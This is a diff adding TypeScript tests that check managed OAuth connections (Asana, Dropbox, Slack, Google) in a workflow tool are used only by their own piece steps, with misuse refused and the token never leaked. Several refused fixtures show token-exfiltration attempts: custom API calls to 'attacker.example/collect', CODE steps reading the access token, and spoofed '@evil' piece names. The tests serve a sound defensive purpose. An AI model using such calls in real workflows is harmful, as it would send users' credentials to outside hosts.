@@ -7,12 +7,16 @@
  */
 
 import { afterEach, beforeEach, describe, expect, test } from "bun:test";
-import { CredentialResolver } from "../credentials/adapter";
+import { CredentialResolver, managedConnectionMisuse, managedSourceFor } from "../credentials/adapter";
 import { JarvisGoogleConnectionSource } from "../credentials/google-source";
 import { JarvisClickUpConnectionSource } from "../credentials/clickup-source";
 import { JarvisMailchimpConnectionSource } from "../credentials/mailchimp-source";
+import { JarvisAsanaConnectionSource } from "../credentials/asana-source";
+import type { JarvisConfig } from "../../config/types";
 import { JarvisGitHubConnectionSource } from "../credentials/github-source";
 import { JarvisTrelloConnectionSource } from "../credentials/trello-source";
+import { JarvisDropboxConnectionSource } from "../credentials/dropbox-source";
+import { JarvisSlackConnectionSource } from "../credentials/slack-source";
 import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -33,9 +37,11 @@ const GMAIL = "@activepieces/piece-gmail";
 const HTTP = "@activepieces/piece-http";
 const SLACK = "@activepieces/piece-slack";
 const CLICKUP = "@activepieces/piece-clickup";
+const ASANA = "@activepieces/piece-asana";
 const MAILCHIMP = "@activepieces/piece-mailchimp";
 const GITHUB = "@activepieces/piece-github";
 const TRELLO = "@activepieces/piece-trello";
+const DROPBOX = "@activepieces/piece-dropbox";
 
 const pieces = new PieceCatalog([
   { name: GMAIL, displayName: "Gmail", description: "", auth: { type: "OAUTH2" }, actions: {
@@ -72,6 +78,15 @@ const pieces = new PieceCatalog([
       { name: "method", label: "", type: "string", required: false },
     ] } },
   } },
+  { name: DROPBOX, displayName: "Dropbox", description: "", auth: { type: "OAUTH2" }, actions: {
+    list_dropbox_folder: { name: "list_dropbox_folder", displayName: "", description: "", inputSchema: { fields: [
+      { name: "path", label: "", type: "string", required: false },
+    ] } },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+  } },
   { name: MAILCHIMP, displayName: "Mailchimp", description: "", auth: { type: "OAUTH2" }, actions: {
     find_subscriber: { name: "find_subscriber", displayName: "", description: "", inputSchema: { fields: [
       { name: "email", label: "", type: "string", required: false },
@@ -84,6 +99,30 @@ const pieces = new PieceCatalog([
   } },
   { name: SLACK, displayName: "Slack", description: "", auth: { type: "OAUTH2" }, actions: {
     send_message: { name: "send_message", displayName: "", description: "" },
+    slack_find_channel: { name: "slack_find_channel", displayName: "", description: "" },
+    slack_get_channel_info: { name: "slack_get_channel_info", displayName: "", description: "" },
+    slack_post_message: { name: "slack_post_message", displayName: "", description: "" },
+    send_channel_message: { name: "send_channel_message", displayName: "", description: "" },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+  }, triggers: {
+    new_message: { name: "new_message", displayName: "", description: "" },
+  } },
+  { name: ASANA, displayName: "Asana", description: "", auth: { type: "OAUTH2" }, actions: {
+    get_task: { name: "get_task", displayName: "", description: "", inputSchema: { fields: [
+      { name: "task", label: "", type: "string", required: false },
+    ] } },
+    delete_task: { name: "delete_task", displayName: "", description: "", inputSchema: { fields: [
+      { name: "task", label: "", type: "string", required: false },
+    ] } },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+  }, triggers: {
+    new_task: { name: "new_task", displayName: "", description: "" },
   } },
   { name: GITHUB, displayName: "GitHub", description: "", auth: { type: "OAUTH2" }, actions: {
     github_create_issue: { name: "github_create_issue", displayName: "", description: "", inputSchema: { fields: [
@@ -369,6 +408,54 @@ describe("managed ClickUp is scoped to ClickUp steps", () => {
   });
 });
 
+describe("managed Asana is scoped to its five qualified Asana actions", () => {
+  const ASANA_TOKEN = "synthetic-managed-asana-access-token";
+  const ref = "{{connections.jarvis:asana}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "asana-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "asana.json"), JSON.stringify({ version: 1, provider: "asana", status: "connected",
+      generation: crypto.randomUUID(), access_token: ASANA_TOKEN, refresh_token: "synthetic-refresh",
+      expires_at: new Date(Date.now() + 3_600_000).toISOString(), account: { id: "7", label: "owner" },
+      workspaces: [{ id: "8", name: "Sandbox" }], connected_at: new Date().toISOString(),
+      refresh: { url: "https://app.usejarvis.dev/api/integrations/asana/refresh", instance_id: crypto.randomUUID(), secret: "a".repeat(64) } }));
+    credentials.register(new JarvisAsanaConnectionSource({ daemon: { data_dir: dataDir },
+      usejarvis_integrations: { page_url: "https://app.usejarvis.dev/account" } } as JarvisConfig));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const step = (actionName: string, input: Record<string, unknown> = { auth: ref, task: "12" }): any => ({
+    name: "asana", type: "PIECE", settings: { pieceName: ASANA, actionName, input },
+  });
+  const asanaCall = (url: string): any => step("custom_api_call", { auth: ref, method: "GET", url: { url } });
+  // A trigger whose settings also carry a stray actionName of a qualified action.
+  const asanaTrigger = (): any => ({ name: "trigger", type: "PIECE_TRIGGER",
+    settings: { pieceName: ASANA, triggerName: "new_task", actionName: "get_task", input: { auth: ref } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["an Asana action outside the qualified five", empty(step("delete_task"))],
+    ["an Asana custom API call, even on app.asana.com", empty(asanaCall("https://app.asana.com/api/1.0/users/me"))],
+    ["an Asana custom API call with a relative path", empty(asanaCall("/users/me"))],
+    ["an Asana trigger that carries a stray actionName", asanaTrigger()],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:asana");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(ASANA_TOKEN);
+    });
+  }
+  test("a qualified Asana step auth is ready and resolves", async () => {
+    const trigger = empty(step("get_task"));
+    expect(bindingIssues(trigger)).toEqual([]);
+    const response = await fetchFor(runOf(trigger), "jarvis:asana");
+    expect(response.status).toBe(200);
+    expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: ASANA, value: { access_token: ASANA_TOKEN, jarvis_managed: "asana" } });
+  });
+});
+
 describe("managed GitHub is scoped to GitHub steps", () => {
   const GITHUB_TOKEN = "synthetic-managed-github-access-token";
   const ref = "{{connections.jarvis:github}}";
@@ -501,6 +588,62 @@ describe("managed Trello is scoped to Trello steps", () => {
   });
 });
 
+describe("managed Dropbox is scoped to Dropbox steps", () => {
+  const DROPBOX_TOKEN = "synthetic-managed-dropbox-access-token";
+  const ref = "{{connections.jarvis:dropbox}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "dropbox-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "dropbox.json"), JSON.stringify({ version: 1, provider: "dropbox", status: "connected",
+      generation: crypto.randomUUID(), access_token: DROPBOX_TOKEN, refresh_token: "synthetic-dropbox-refresh",
+      expires_at: new Date(Date.now() + 3600000).toISOString(), account: { id: "dbid:1", label: "owner" },
+      workspaces: [{ id: "123", name: "Dropbox home" }], settings: { home_namespace_id: "123" }, connected_at: new Date().toISOString(),
+      refresh: { url: "https://app.usejarvis.dev/api/integrations/dropbox/refresh", instance_id: crypto.randomUUID(), secret: "a".repeat(64) } }));
+    const config = { daemon: { data_dir: dataDir }, usejarvis_integrations: { page_url: "https://app.usejarvis.dev/account" } } as JarvisConfig;
+    // No network: the stored token is fresh, so resolve never refreshes.
+    credentials.register(new JarvisDropboxConnectionSource(config, (async () => { throw new Error("no network in tests"); }) as unknown as typeof fetch));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const step = (input: Record<string, unknown> = { auth: ref }, nextAction?: any, actionName = "list_dropbox_folder"): any => ({
+    name: "files", type: "PIECE", settings: { pieceName: DROPBOX, actionName, input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const dropboxCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: DROPBOX, actionName: "custom_api_call", input: { auth: ref, method: "POST", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a Dropbox step next to a CODE step that reads the token", empty(step(undefined, code({ token: "{{connections['jarvis:dropbox'].access_token}}" })))],
+    ["a Dropbox custom API call to another host", empty(dropboxCall("https://attacker.example/collect"))],
+    // The managed connection runs only its qualified actions; the engine would refuse these too.
+    ["a Dropbox custom API call on api.dropboxapi.com", empty(dropboxCall("https://api.dropboxapi.com/2/files/delete_v2"))],
+    ["a Dropbox action outside the managed set", empty(step({ auth: ref }, undefined, "delete_dropbox_file"))],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:dropbox");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(DROPBOX_TOKEN);
+    });
+  }
+  test("the refusal names Dropbox", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:dropbox can only be used by Dropbox steps");
+    expect(issue!.allowedPieces).toEqual([DROPBOX]);
+  });
+  test("a Dropbox step auth on a qualified action passes the connection scope and resolves", async () => {
+    for (const actionName of ["search_dropbox", "list_dropbox_folder", "get_dropbox_file_metadata", "create_new_dropbox_folder"]) {
+      const trigger = empty(step({ auth: ref }, undefined, actionName));
+      expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:dropbox");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: DROPBOX, value: { access_token: DROPBOX_TOKEN, jarvis_managed: "dropbox" } });
+    }
+  });
+});
+
 describe("managed Mailchimp is scoped to Mailchimp steps", () => {
   const MAILCHIMP_TOKEN = "synthetic-managed-mailchimp-access-token";
   const ref = "{{connections.jarvis:mailchimp}}";
@@ -567,5 +710,198 @@ describe("managed Mailchimp is scoped to Mailchimp steps", () => {
       expect(response.status).toBe(200);
       expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: MAILCHIMP, value: { access_token: MAILCHIMP_TOKEN, server_prefix: "us1", jarvis_managed: "mailchimp" } });
     }
+  });
+});
+
+describe("managed Slack is scoped to Slack steps", () => {
+  const SLACK_TOKEN = "synthetic-managed-slack-bot-token";
+  const ref = "{{connections.jarvis:slack}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "slack-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "slack.json"), JSON.stringify({ version: 1, provider: "slack", status: "connected",
+      generation: crypto.randomUUID(), access_token: SLACK_TOKEN, account: { id: "U123", label: "Jarvis bot" },
+      workspaces: [{ id: "T123", name: "Sandbox" }], settings: { scopes: "channels:read,chat:write,groups:read" },
+      connected_at: new Date().toISOString() }));
+    credentials.register(new JarvisSlackConnectionSource(dataDir));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const post = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
+    name: "post", type: "PIECE", settings: { pieceName: SLACK, actionName: "slack_post_message", input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const slackTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
+    settings: { pieceName: SLACK, triggerName: "new_message", input: { auth: ref }, ...extra } });
+  const slackCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: SLACK, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a Slack step next to a CODE step that reads the token", empty(post(undefined, code({ token: "{{connections['jarvis:slack'].access_token}}" })))],
+    ["a Slack custom API call to another host", empty(slackCall("https://attacker.example/collect"))],
+    // Defense in depth: only the four managed Slack actions get the token, even on Slack's own API host.
+    ["a Slack custom API call to a path under its API", empty(slackCall("/auth.test"))],
+    ["a Slack custom API call on slack.com", empty(slackCall("https://slack.com/api/auth.test"))],
+    ["a Slack action outside the managed actions", empty({ name: "send", type: "PIECE", settings: { pieceName: SLACK, actionName: "send_message", input: { auth: ref } } })],
+    ["a Slack trigger", slackTrigger()],
+    ["a Slack trigger that also carries a managed actionName", slackTrigger({ actionName: "slack_post_message" })],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:slack");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(SLACK_TOKEN);
+    });
+  }
+  test("the refusal names Slack", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:slack can only be used by Slack steps");
+    expect(issue!.allowedPieces).toEqual([SLACK]);
+    const [call] = bindingIssues(empty(slackCall("https://slack.com/api/auth.test")));
+    expect(call!.message).toBe("This Slack connection does not support this action or trigger yet");
+  });
+  test("a trigger hook of a Slack trigger is refused the token", async () => {
+    for (const trigger of [slackTrigger(), slackTrigger({ actionName: "slack_post_message" })]) {
+      const flow = createFlow({});
+      const version = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger });
+      const response = await fetchFor(triggerHookRunId("poll", flow.id, version), "jarvis:slack");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(SLACK_TOKEN);
+    }
+  });
+  test("every managed Slack action's auth passes the connection scope and resolves", async () => {
+    for (const actionName of ["slack_find_channel", "slack_get_channel_info", "slack_post_message", "send_channel_message"]) {
+      const trigger = empty({ name: "step", type: "PIECE", settings: { pieceName: SLACK, actionName, input: { auth: ref } } });
+      expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:slack");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: SLACK, value: { access_token: SLACK_TOKEN } });
+    }
+  });
+});
+
+describe("the meeting preparation step may name managed Google only as its Calendar or Gmail account", () => {
+  const CONTEXT = "@jarvispieces/piece-jarvis-context";
+  const CALENDAR = "@activepieces/piece-google-calendar";
+  const meeting = (input: Record<string, unknown>, settings: Record<string, unknown> = {}): any => ({
+    name: "prepare", type: "PIECE", settings: { pieceName: CONTEXT, actionName: "meeting_briefs", input, ...settings },
+  });
+  const at = (trigger: unknown, field: string) => bindingIssues(trigger).filter(i => i.path === `settings.input.${field}`);
+  const google = () => managedSourceFor(credentials.list(), "jarvis:google")!;
+
+  test("readiness accepts jarvis:google as the Calendar account and as the Gmail account", () => {
+    expect(at(empty(meeting({ calendarConnection: "jarvis:google" })), "calendarConnection")).toEqual([]);
+    expect(at(empty(meeting({ gmailConnection: "jarvis:google" })), "gmailConnection")).toEqual([]);
+  });
+
+  test("readiness refuses jarvis:google on a CODE node that carries the meeting step's settings", () => {
+    const spoof = { ...meeting({ calendarConnection: "jarvis:google", gmailConnection: "jarvis:google" }), type: "CODE" };
+    expect(at(empty(spoof), "calendarConnection").length).toBeGreaterThan(0);
+    expect(at(empty(spoof), "gmailConnection").length).toBeGreaterThan(0);
+  });
+
+  test("readiness refuses jarvis:google as the HubSpot account", () => {
+    expect(at(empty(meeting({ hubspotConnection: "jarvis:google" })), "hubspotConnection").length).toBeGreaterThan(0);
+  });
+
+  test("readiness refuses another managed connection as the Calendar account", () => {
+    const dataDir = mkdtempSync(join(tmpdir(), "meeting-scope-"));
+    try {
+      mkdirSync(join(dataDir, "connections"));
+      writeFileSync(join(dataDir, "connections", "clickup.json"), JSON.stringify({ version: 1, provider: "clickup", status: "connected",
+        generation: crypto.randomUUID(), access_token: "synthetic-clickup", account: { id: "7", label: "owner" },
+        workspaces: [{ id: "8", name: "Sandbox" }], connected_at: new Date().toISOString() }));
+      credentials.register(new JarvisClickUpConnectionSource(dataDir));
+      const [issue] = at(empty(meeting({ calendarConnection: "jarvis:clickup" })), "calendarConnection");
+      expect(issue!.message).toBe("Managed connection jarvis:clickup can only be used by ClickUp steps");
+    } finally { credentials.unregister("clickup"); rmSync(dataDir, { recursive: true, force: true }); }
+  });
+
+  test("the exemption covers exactly the two account inputs of meeting_briefs, each with its own provider", () => {
+    const settings = meeting({}).settings;
+    expect(managedConnectionMisuse(google(), CALENDAR, "settings.input.calendarConnection", settings, "PIECE")).toBeNull();
+    expect(managedConnectionMisuse(google(), GMAIL, "settings.input.gmailConnection", settings, "PIECE")).toBeNull();
+    expect(managedConnectionMisuse(google(), CALENDAR, "settings.input.calendarConnection", { ...settings, pieceName: "jarvis-context" }, "PIECE")).toBeNull();
+    expect(managedConnectionMisuse(google(), "jarvis-context", "settings.input.calendarConnection", { ...settings, pieceName: "jarvis-context" }, "PIECE")).not.toBeNull();
+    const refused: Array<[label: string, piece: string, path: string, settings: unknown, nodeType?: unknown]> = [
+      ["a CODE node carrying the meeting step's settings", CALENDAR, "settings.input.calendarConnection", settings, "CODE"],
+      ["a caller that does not say the node type", CALENDAR, "settings.input.calendarConnection", settings, undefined],
+      ["a piece whose name only ends in jarvis-context", CALENDAR, "settings.input.calendarConnection", { ...settings, pieceName: "@evil/piece-jarvis-context" }],
+      ["a spoofed Gmail account on such a piece", GMAIL, "settings.input.gmailConnection", { ...settings, pieceName: "@evil/piece-jarvis-context" }],
+      ["the HubSpot account", "@activepieces/piece-hubspot", "settings.input.hubspotConnection", settings],
+      ["any other input of the step", CALENDAR, "settings.input.calendarId", settings],
+      ["a nested path", CALENDAR, "settings.input.calendarConnection.id", settings],
+      ["the Calendar account read as Gmail", GMAIL, "settings.input.calendarConnection", settings],
+      ["the Gmail account read as Calendar", CALENDAR, "settings.input.gmailConnection", settings],
+      ["another jarvis-context action", CALENDAR, "settings.input.calendarConnection", { ...settings, actionName: "lookup" }],
+      ["another piece's step", CALENDAR, "settings.input.calendarConnection", { ...settings, pieceName: CALENDAR }],
+      ["a trigger", CALENDAR, "settings.input.calendarConnection", { ...settings, triggerName: "meeting_briefs" }],
+      ["a caller without the step's settings", CALENDAR, "settings.input.calendarConnection", undefined],
+    ];
+    for (const [label, piece, path, stepSettings, nodeType = "PIECE"] of refused) {
+      expect([label, managedConnectionMisuse(google(), piece, path, stepSettings, label.includes("node type") ? undefined : nodeType)]).not.toEqual([label, null]);
+    }
+  });
+
+  test("a source that is not the managed Google one gets no exemption, even when it serves Calendar", () => {
+    const other = { id: "other", pieceNames: [CALENDAR, GMAIL], canResolve: (id: string) => id === "jarvis:other", resolve: async () => null };
+    expect(managedConnectionMisuse(other, CALENDAR, "settings.input.calendarConnection", meeting({}).settings, "PIECE")).not.toBeNull();
+  });
+});
+
+describe("the sales follow-up step may name managed Google only as its Gmail account", () => {
+  const SALES = "@jarvispieces/piece-jarvis-sales";
+  const HUBSPOT = "@activepieces/piece-hubspot";
+  const sales = (input: Record<string, unknown>, settings: Record<string, unknown> = {}): any => ({
+    name: "prepare", type: "PIECE", settings: { pieceName: SALES, actionName: "draft_followups", input, ...settings },
+  });
+  const at = (trigger: unknown, field: string) => bindingIssues(trigger).filter(i => i.path === `settings.input.${field}`);
+  const google = () => managedSourceFor(credentials.list(), "jarvis:google")!;
+
+  test("readiness accepts jarvis:google as the Gmail account", () => {
+    expect(at(empty(sales({ gmailConnection: "jarvis:google" })), "gmailConnection")).toEqual([]);
+  });
+
+  test("readiness refuses jarvis:google on a CODE node that carries the sales step's settings", () => {
+    const spoof = { ...sales({ gmailConnection: "jarvis:google" }), type: "CODE" };
+    expect(at(empty(spoof), "gmailConnection").length).toBeGreaterThan(0);
+  });
+
+  test("readiness refuses a managed id as the HubSpot account", () => {
+    for (const id of ["jarvis:google", "jarvis:hubspot"]) {
+      const [issue] = at(empty(sales({ hubspotConnection: id })), "hubspotConnection");
+      expect(issue!.message).toBe("Select a saved HubSpot account; a Jarvis-managed connection cannot read HubSpot");
+    }
+  });
+
+  test("the exemption covers exactly the Gmail account input of draft_followups, read as Gmail", () => {
+    const settings = sales({}).settings;
+    expect(managedConnectionMisuse(google(), GMAIL, "settings.input.gmailConnection", settings, "PIECE")).toBeNull();
+    expect(managedConnectionMisuse(google(), GMAIL, "settings.input.gmailConnection", { ...settings, pieceName: "jarvis-sales" }, "PIECE")).toBeNull();
+    expect(managedConnectionMisuse(google(), SALES, "settings.input.gmailConnection", settings, "PIECE")).not.toBeNull();
+    const refused: Array<[label: string, piece: string, path: string, settings: unknown, nodeType?: unknown]> = [
+      ["a CODE node carrying the sales step's settings", GMAIL, "settings.input.gmailConnection", settings, "CODE"],
+      ["a caller that does not say the node type", GMAIL, "settings.input.gmailConnection", settings, undefined],
+      ["a piece whose name only ends in jarvis-sales", GMAIL, "settings.input.gmailConnection", { ...settings, pieceName: "@evil/piece-jarvis-sales" }],
+      ["the HubSpot account", HUBSPOT, "settings.input.hubspotConnection", settings],
+      ["the HubSpot account read as Gmail", GMAIL, "settings.input.hubspotConnection", settings],
+      ["any other input of the step", GMAIL, "settings.input.ownerEmail", settings],
+      ["a nested path", GMAIL, "settings.input.gmailConnection.id", settings],
+      ["the Gmail account read as Calendar", "@activepieces/piece-google-calendar", "settings.input.gmailConnection", settings],
+      ["another jarvis-sales action", GMAIL, "settings.input.gmailConnection", { ...settings, actionName: "lookup" }],
+      ["another piece's step", GMAIL, "settings.input.gmailConnection", { ...settings, pieceName: GMAIL }],
+      ["a trigger", GMAIL, "settings.input.gmailConnection", { ...settings, triggerName: "draft_followups" }],
+      ["a caller without the step's settings", GMAIL, "settings.input.gmailConnection", undefined],
+    ];
+    for (const [label, piece, path, stepSettings, nodeType = "PIECE"] of refused) {
+      expect([label, managedConnectionMisuse(google(), piece, path, stepSettings, label.includes("node type") ? undefined : nodeType)]).not.toEqual([label, null]);
+    }
+  });
+
+  test("a source that is not the managed Google one gets no exemption, even when it serves Gmail", () => {
+    const other = { id: "other", pieceNames: [GMAIL], canResolve: (id: string) => id === "jarvis:other", resolve: async () => null };
+    expect(managedConnectionMisuse(other, GMAIL, "settings.input.gmailConnection", sales({}).settings, "PIECE")).not.toBeNull();
   });
 });
